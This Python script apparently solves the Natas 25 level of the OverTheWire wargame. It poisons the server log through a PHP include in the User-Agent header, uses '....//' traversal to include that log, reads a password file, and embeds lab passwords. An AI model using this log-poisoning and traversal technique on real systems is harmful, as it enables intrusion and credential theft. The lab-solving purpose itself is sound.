import requests

level = str(25)
pw = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"

url = "http://natas"+level+".natas.labs.overthewire.org/index.php"


s = requests.Session()
s.auth = ('natas'+level, pw)


params = (("lang", "de"), ("debug", "true"))
r = s.get(url, params=params)

print(r.headers)
cookie = r.headers['Set-Cookie']
sid = cookie.split(":").__getitem__(0)
sess_id = sid.split("=").__getitem__(1)[:-6]
cookie = {"PHPSESSID": sess_id}

print("sessionId: " + sess_id)

user_agent = "<?php include '/etc/natas_webpass/natas26'; ?>"
dir_back = "....//"
log_file = "var/www/natas/natas25/logs/natas25_" + sess_id + ".log"
payload = dir_back * 5 + log_file

headers = {"User-Agent": user_agent}

params = (("lang", payload), ("debug", "true"))
r = s.get(url, params=params, headers=headers)

print(r.text)


# oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T